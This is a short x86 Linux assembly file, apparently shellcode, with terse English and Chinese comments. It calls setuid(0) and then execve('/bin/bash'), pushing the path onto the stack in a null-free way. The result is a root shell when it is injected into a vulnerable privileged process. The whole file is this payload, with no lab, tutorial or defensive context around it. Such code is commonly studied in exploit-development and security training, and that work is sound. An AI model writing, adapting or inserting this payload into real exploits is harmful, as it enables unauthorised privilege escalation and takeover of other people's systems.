global _start

_start:
; setuid(0)
xor ebx, ebx ; 0
xor eax, eax
mov al, 23 ; setuid -> 23
int 0x80

; execve('/bin/bash', (char**)'/bin/bash', NULL)
xor edx, edx    ; edx -> NULL

xor eax, eax
mov al, 0x68
push eax
mov eax, 0x7361622f
push eax
mov eax, 0x6e69622f
push eax ;/bin/bash 压栈

mov ebx, esp    ; ebx -> char* /bin/bash

xor eax, eax
push eax
push ebx
mov ecx, esp    ; ecx -> char** /bin/bash

mov    al,11
int 0x80